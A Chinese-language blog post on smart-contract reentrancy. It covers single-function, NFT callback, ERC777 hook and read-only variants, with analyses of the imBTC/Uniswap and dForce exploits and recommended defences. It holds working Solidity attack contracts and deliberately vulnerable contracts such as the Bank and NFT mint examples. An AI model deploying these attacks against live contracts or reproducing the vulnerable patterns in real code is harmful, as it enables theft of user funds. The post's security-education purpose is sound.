# 关于Reentrance攻击的思考

​		最近学习了web3安全方面的知识，对相关知识点做总结与思考。重入攻击是最开始接触的漏洞，漏洞影响的方面非常广泛。从token转账接收、闪电贷、预言机、跨链桥等方面都深受影响。不仅可以造成资金损失，在一些场景下也可以造成dos攻击。

​		重入是`“递归”`的含义，本质是`循环调用缺陷`。重入漏洞(或者叫做**重入攻击**)，本质是一种循环调用，类似于其他语言中的死循环调用代码缺陷。目前对重入漏洞的划分类型有如下，参考[reentrancy](https://scsfg.io/hackers/reentrancy/)

- 单函数重入
- 跨函数重入
- 跨合约重入
- 只读重入

​		单函数和跨函数重入都发生在同一合约中，区别在于fallback函数重入的对象是原函数还是新的函数。在实际的场景中，开发者通常会使用起到互斥锁作用的函数修饰器防御重入攻击；函数修饰器对单函数重入的防御效果很好。但也正因如此，开发者忽略了跨函数重入这种攻击路径。



## **接收和发送ETF或代币的场景**

`receive()`只用于处理接收`ETH`。声明方式：`receive() external payable { ... }`。

`fallback()`函数会在调用合约不存在的函数时被触发。可用于接收ETH或代币，也可以用于代理合约`proxy contract`。声明方式：`fallback() external payable { ... }`。

```
触发fallback() 还是 receive()?
           接收ETH
              |
         msg.data是空？
            /  \
          是    否
          /      \
receive()存在?   fallback()
        / \
       是  否
      /     \
receive()   fallback()
```



`receive()`和`payable fallback()`均不存在的时候，向合约**直接**发送`ETH`将会报错（你仍可以通过带有`payable`的函数向合约发送`ETH`）。当然可以通过`selfdestruct(_addr)`来向指定合约发送`ETH`。



`Solidity`有三种方法向其他合约发送`ETH`，他们是：`transfer()`，`send()`和`call()`。

**transfer**( )

- 用法是`接收方地址.transfer(发送ETH数额)`。
- `transfer()`的`gas`限制是`2300`，足够用于转账。
- `transfer()`如果转账失败，会自动`revert`（回滚交易）。



**send**( )

- 用法是`接收方地址.send(发送ETH数额)`。
- `send()`的`gas`限制是`2300`，足够用于转账。
- `send()`如果转账失败，不会`revert`。
- `send()`的返回值是`bool`，代表着转账成功或失败，需要额外代码处理。



**call( )**

- 用法是`接收方地址.call{value: 发送ETH数额}("")`。
- `call()`没有`gas`限制，可以支持对方合约`fallback()`或`receive()`函数实现复杂逻辑。
- `call()`如果转账失败，不会`revert`。
- `call()`的返回值是`(bool, data)`，其中`bool`代表着转账成功或失败，需要额外代码处理一下。



可以看出transfer和send函数在调用时有gas限制，如果超过了2300 gas时，这两个函数就会返回。但call()函数没有Gas限制，可以将整个交易中设置的Gas用光。所以常见的重入攻击是使用了最不安全的call()函数，**但gas成本降低，调用transfer和send函数还是存在重入攻击风险**。



以下是使用了call函数的攻击示例代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Bank {
    mapping (address => uint256) public balanceOf;    // 余额mapping

    // 存入ether，并更新余额
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // 提取msg.sender的全部ether
    function withdraw() external {
        uint256 balance = balanceOf[msg.sender]; // 获取余额
        require(balance > 0, "Insufficient balance");
        // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
        // 更新余额
        balanceOf[msg.sender] = 0;
    }

    // 获取银行合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    Bank public bank; // Bank合约地址

    // 初始化Bank合约地址
    constructor(Bank _bank) {
        bank = _bank;
    }

    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
    receive() external payable {
        if (bank.getBalance() >= 1 ether) {
            bank.withdraw();
        }
    }

    // 攻击函数，调用时 msg.value 设为 1 ether
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // 获取本合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```





## **nft场景下的重入攻击**

转账NFT时并不会触发合约的`fallback`或`receive`函数，为什么也有重入风险呢？实际上存在回调函数就有重入的风险，比如 `ERC721` 的 `safeTransferFrom()` 函数会调用目标地址的 `onERC721Received()` 函数，而黑客可以把恶意代码嵌入其中进行攻击。

关于ERC721和ERC1155的协议中，涉及到回调函数的函数如下：



**ERC721**

```
_safeTransferFrom
_safeTransfer
_safeMint
_checkOnERC721Received
```

**ERC1155**

```
_safeTransferFrom
_safeTransferFrom
_safeBatchTransferFromsafeBatchTransferFrom
_mint
_mintBatch
_doSafeTransferAcceptanceCheck
_doSafeBatchTransferAcceptanceCheck
```



下面的代码示例是用到了ERC721协议中的_safeMint函数，调用目标地址的 `onERC721Received()` 函数完成重入攻击。

`Attack`合约继承了`IERC721Receiver`合约，它有 `1` 个状态变量`nft`记录了有漏洞的NFT合约地址。它有 `3` 个函数:

- 构造函数: 初始化有漏洞的NFT合约地址。
- `attack()`: 攻击函数，调用NFT合约的`mint()`函数并发起攻击。
- `onERC721Received()`: 嵌入了恶意代码的ERC721回调函数，会重复调用`mint()`函数，并铸造10个NFT。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

// NFT contract with Reentrancy Vulnerability
contract NFTReentrancy is ERC721 {
    uint256 public totalSupply;
    mapping(address => bool) public mintedAddress;
    // 构造函数，初始化NFT合集的名称、代号
    constructor() ERC721("Reentry NFT", "ReNFT"){}

    // 铸造函数，每个用户只能铸造1个NFT
    // 有重入漏洞
    function mint() payable external {
        // 检查是否mint过
        require(mintedAddress[msg.sender] == false);
        // 增加total supply
        totalSupply++;
        // mint
        _safeMint(msg.sender, totalSupply);
        // 记录mint过的地址
        mintedAddress[msg.sender] = true;
    }
}

contract Attack is IERC721Receiver{
    NFTReentrancy public nft; // Bank合约地址

    // 初始化NFT合约地址
    constructor(NFTReentrancy _nftAddr) {
        nft = _nftAddr;
    }
    
    // 攻击函数，发起攻击
    function attack() external {
        nft.mint();
    }

    // ERC721的回调函数，会重复调用mint函数，铸造10个
    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        if(nft.balanceOf(address(this)) < 10){
            nft.mint();
        }
        return this.onERC721Received.selector;
    }
}
```





## **ERC777场景下的重入攻击**

​		ERC777 协议是以太坊上的代币标准协议，该协议是以太坊上 ERC20 协议的改进版。例如消除了容易引起歧义的decimals，其核心功能是发送和接收的hook。当向其发送和接收代币时会被调用，这意味着账户和合约可以对发送和接收代币做出反应。代币的发送和发送方均可以实现回调功能，执行存在风险的操作。

相关实践案例可以参考： https://learnblockchain.cn/2019/09/27/erc777

对比ERC20协议，主要的改进点如下：

**1、使用和发送以太相同的理念发送 token，方法为：send(dest, value, data)**

**2、合约和普通地址都可以通过注册 tokensToSend hook 函数来控制和拒绝发送哪些token（拒绝发送通过在hook函数tokensToSend 里 revert 来实现）**

**3、合约和普通地址都可以通过注册 tokensReceived hook 函数来控制和拒绝接受哪些token（拒绝接受通过在hook函数tokensReceived 里 revert 来实现）**

**4、tokensReceived 可以通过 hook 函数可以做到在一个交易里完成发送代币和通知合约接受代币，而不像 ERC20 必须通过两次调用（approve/transferFrom）来完成**

**5、持有者可以"授权"和"撤销"操作员（operators: 可以代表持有者发送代币） 这些操作员通常是（去中心化）交易所、支票处理机或自动支付系统**

**6、每个代币交易都包含 data 和 operatorData 字段， 可以分别传递来自持有者和操作员的数据**

**7、可以通过部署实现 tokensReceived 的代理合约来兼容没有实现tokensReceived 函数的地址**



ERC20 代币只是在转账过程中更新余额。但 ERC777 代币的转账操作如下：

1. 对代币发起者的地址进行 Hook 调用
2. 更新余额
3. 对代币接收方地址进行 Hook 调用

在调用ERC777合约的发送方法(transfer,send,burn,operatorSend,operatorBurn)时，都会和transfer函数一样，调用发送与接收方的hook方法

```solidity
function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(recipient != address(0), "ERC777: transfer to the zero address");

        address from = _msgSender();

        _callTokensToSend(from, from, recipient, amount, "", "");

        _move(from, from, recipient, amount, "", "");

        _callTokensReceived(from, from, recipient, amount, "", "", false);

        return true;
    }
```



**安全事件分析**

以早期Tokenlon遭受ERC777重入攻击事件为例做分析。由于 imBTC 是基于 ERC777 实现的，在上线 Uniswap 后，攻击者通过组合 ERC777 的特性及 Uniswap 代码上的问题，使攻击者可以通过重入漏洞实现套利。

通过phalcon工具来查看攻击时的细节：https://phalcon.blocksec.com/explorer/tx/eth/0x32c83905db61047834f29385ff8ce8cb6f3d24f97e24e6101d8301619efee96e?line=51

![image-20240129154811116](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/reentrance/1.png)

从上面看到通过tokenToEthSwapInput调用触发了0xbd2250d713bf98b7e00c26e2907370ad30f0891a的tokensToSend函数，之后在函数中又一次调用了tokenToEthSwapInput。tokenToEthSwapInput内部的合约调用时没法看到的，所以需要分析该函数的代码。当然我们可以先看下攻击者合约的反编译代码，分析下tokensToSend函数内部使用了哪些逻辑。

https://app.dedaub.com/ethereum/address/0xbd2250d713bf98b7e00c26e2907370ad30f0891a/decompiled

```solidity
function tokensToSend(address varg0, address varg1, address varg2, uint256 varg3, bytes varg4, bytes varg5) public nonPayable { 
    require(msg.data.length - 4 >= 192);
    require(varg4 <= 0x100000000);
    require(4 + varg4 + 32 <= 4 + (msg.data.length - 4));
    require(!((varg4.length > 0x100000000) | (36 + varg4 + varg4.length > 4 + (msg.data.length - 4))));
    require(varg5 <= 0x100000000);
    require(4 + varg5 + 32 <= 4 + (msg.data.length - 4));
    require(!((varg5.length > 0x100000000) | (36 + varg5 + varg5.length > 4 + (msg.data.length - 4))));
    require(msg.sender == _tokensToSend, Error('Only DhD'));
    if (stor_3 < stor_2) {
        stor_3 = stor_3 + 1;
        require(0xc0a47dfe034b400b47bdad5fecda2621de6c4d95.code.size);
        v0, v1 = 0xc0a47dfe034b400b47bdad5fecda2621de6c4d95.getExchange(_tokensToSend).gas(msg.gas);
        require(v0); // checks call status, propagates error data on error
        require(RETURNDATASIZE() >= 32);
        require((address(v1)).code.size);
        v2, v3 = address(v1).tokenToEthSwapInput(stor_4, 1, ~0).gas(msg.gas);
        require(v2); // checks call status, propagates error data on error
        require(RETURNDATASIZE() >= 32);
    }
}
```

可以看到`stor_3 < stor_2`此处是结束调用的条件，在函数0xdaf8be1f中看到stor_3为1，stor_2可以从内存中读取插槽数据。函数中主要是对tokenToEthSwapInput的回调。接下来分析tokenToEthSwapInput函数代码

```solidity
@private
def tokenToEthInput(tokens_sold: uint256, min_eth: uint256(wei), deadline: timestamp, buyer: address, recipient: address) -> uint256(wei):
    assert deadline >= block.timestamp and (tokens_sold > 0 and min_eth > 0)
    token_reserve: uint256 = self.token.balanceOf(self)
    eth_bought: uint256 = self.getInputPrice(tokens_sold, token_reserve, as_unitless_number(self.balance))
    wei_bought: uint256(wei) = as_wei_value(eth_bought, 'wei')
    assert wei_bought >= min_eth
    send(recipient, wei_bought)
    assert self.token.transferFrom(buyer, self, tokens_sold)
    log.EthPurchase(buyer, tokens_sold, wei_bought)
    return wei_bought
```

上面是 Uniswap 的 ethToTokenSwapInput 函数代码， ethToTokenSwapInput 函数会调用 ethToTokenInput 函数，先通过 getInputPrice 获取代币能换取的 eth 数量，之后通过 send 函数将 eth 发给用户，最后再通过 transferFrom 把代币转进合约。我们继续跟进 getInputPrice 函数。

```solidity
def getInputPrice(input_amount: uint256, input_reserve: uint256, output_reserve: uint256) -> uint256:
    assert input_reserve > 0 and output_reserve > 0
    input_amount_with_fee: uint256 = input_amount * 997
    numerator: uint256 = input_amount_with_fee * output_reserve
    denominator: uint256 = (input_reserve * 1000) + input_amount_with_fee
    return numerator / denominator
```

通过分析 getInputPrice 函数，获取ETH 获取量计算的公式。其中经过一次 ethToTokenSwapInput调用，ETH储备量就会下降。然后 Uniswap 调用 transferFrom 函数 (此时还未将攻击者的 imBTC 扣除)。那么此时transferFrom 函数会调用攻击者的tokensToSend函数，攻击者进行第二次的 ethToTokenSwapInput调用。使分子发生了变化，而公式的分母不会发生变化。

相比正常的兑换，攻击者通过重入方式进行的第二次兑换会获取微小的利润，导致有利可图。重复这样的过程，就能通过等量的 imBTC 获取更多的 ETH，导致 Uniswap 做事商的损失。

<img src="https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/reentrance/2.png" alt="image-20240129162245904" style="zoom:50%;" />







## 只读型重入漏洞场景



​		只读型重入漏洞发生的位置是智能合约中 view 函数，由于该类型的函数并不对合约的状态变量进行修改，因此大多数情况下该类型的函数并不会使用重入锁进行修饰。当受害合约调用存在漏洞合约的 view 函数时，由于此时 view 函数中使用到的状态变量还未更新，导致受害合约通过 view 函数获取的数据也是未更新的，如果此时受害合约依赖 view 函数返回的值，则可能会出现异常的状况，如计算抵押物价格异常、奖励计算错误。



**攻击事件分析**

​		2023 年 2 月 9 日，DeFi 协议 dForcenet 遭到了黑客攻击，被攻击的根本原因是其预言机使用了 Curve 流动性池的 get_virtual_price 函数的返回值。Curve 是一个去中心化交易所，用户可以向流动性池中提供流动性资产，从而获得相应份额的 LP 代币，该代币代表着流动性池中的份额。

​		当用户移除流动性时，合约会燃烧掉 LP 代币，并发送相应的流动性资产给用户。同时合约提供了一个函数 get_virtual_price 用于计算 LP 代币的虚拟价值，其计算公式是使用 D 除以 LP 代币的总供应量 ，D 可以简单理解为流动性代币的总值。代码如下：

```
@view
@external
def get_virtual_price() -> uint256:
    """
    @notice The current virtual price of the pool LP token
    @dev Useful for calculating profits
    @return LP token virtual price normalized to 1e18
    """
    D: uint256 = self._get_D(self._xp(), self._A())
    # D is in the units similar to DAI (e.g. converted to precision 1e18)
    # When balanced, D = n * x_u - total virtual value of the portfolio
    token_supply: uint256 = ERC20(self.lp_token).totalSupply()
    return D * PRECISION / token_supply
```

移除流动性remove_liquidity函数如下，`CurveToken(lp_token).burnFrom(msg.sender, _amount)`燃烧会进入fallback回调

```
@external
@nonreentrant('lock')
def remove_liquidity(_amount: uint256, _min_amounts: uint256[N_COINS]) -> uint256[N_COINS]:
    """
    @notice Withdraw coins from the pool
    @dev Withdrawal amounts are based on current deposit ratios
    @param _amount Quantity of LP tokens to burn in the withdrawal
    @param _min_amounts Minimum amounts of underlying coins to receive
    @return List of amounts of coins that were withdrawn
    """
    lp_token: address = self.lp_token
    total_supply: uint256 = CurveToken(lp_token).totalSupply()
    amounts: uint256[N_COINS] = empty(uint256[N_COINS])

    for i in range(N_COINS):
        old_balance: uint256 = self.balances[i]
        value: uint256 = old_balance * _amount / total_supply
        assert value >= _min_amounts[i], "Withdrawal resulted in fewer coins than expected"
        self.balances[i] = old_balance - value
        amounts[i] = value
        _response: Bytes[32] = raw_call(
            self.coins[i],
            concat(
                method_id("transfer(address,uint256)"),
                convert(msg.sender, bytes32),
                convert(value, bytes32),
            ),
            max_outsize=32,
        )
        if len(_response) > 0:
            assert convert(_response, bool)

    CurveToken(lp_token).burnFrom(msg.sender, _amount)  # dev: insufficient funds

    log RemoveLiquidity(msg.sender, amounts, empty(uint256[N_COINS]), total_supply - _amount)

    return amounts
```





进入攻击交易查看调用信息：https://arbiscan.io/tx/0x5db5c2400ab56db697b3cc9aa02a05deab658e1438ce2f8692ca009cc45171dd



1.通过闪电贷贷出大量的 WETH，调用 Curve ETH/wstETH 池的 add_liquidity 添加流动性，获得 wstETHCRV。

2.将部分 wstETHCRV 转移到另一个攻击合约，并在 wstETHCRV-gauge 合约中**质押借出 wstETHCRV-gauge 和 USX** 。

3.调用 Curve ETH/wstETH 池的 remove_liquidity 函数移除流动性，移除流动性时进入到攻击合约的 fallback 函数的逻辑中。

4.dForcenet 的预言机使用了 Curve ETH/wstETH 池的 get_virtual_price 函数，在此时的重入状态下，由于 池中 ETH 的余额已经减小，但是 wstETHCRV 的总供应量还未改变，获取到的虚拟价格会变小。

5.攻击者在 fallback 中清算另一个攻击合约以及一个用户的借款。

6.最后再将 wstETHCRV-gauge 经过一些列操作兑换成了 WETH，归还闪电贷后，获利 1236 个 ETH 以及 71 万个 USX 代币。





## 预防方法



主要有两种办法来预防重入攻击漏洞： 检查-影响-交互模式（checks-effect-interaction）和重入锁。

1. 检查-影响-交互模式：它强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。我们可以用这个模式修复有漏洞的`mint()`函数:

```
    function mint() payable external {
        // 检查是否mint过
        require(mintedAddress[msg.sender] == false);
        // 增加total supply
        totalSupply++;
        // 记录mint过的地址
        mintedAddress[msg.sender] = true;
        // mint
        _safeMint(msg.sender, totalSupply);
    }
```

2.重入锁：它是一种防止重入函数的修饰器（modifier）。建议直接使用OpenZeppelin提供的[ReentrancyGuard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol)



## 总结

在DeFi 世界里每天都会发生很多攻击事件，重入攻击也是一直都有。想要解决这类风险问题，还是需要对自身及接入的第三方DeFi 平台的业务逻辑非常清楚，在对应的代码上做风险检查。早期的观点是用重入锁保护所有可能改变合约状态的函数，但实际上也可以看到view函数的读取状态也是会被操纵的。

当前还需要学习更多的攻击案例来了解web3生态，个人觉得web3安全最难的是业务逻辑，因为相关协议特别多，需要持续性学习新的知识才能看懂攻击者的思路以及提升自己挖掘漏洞的能力。





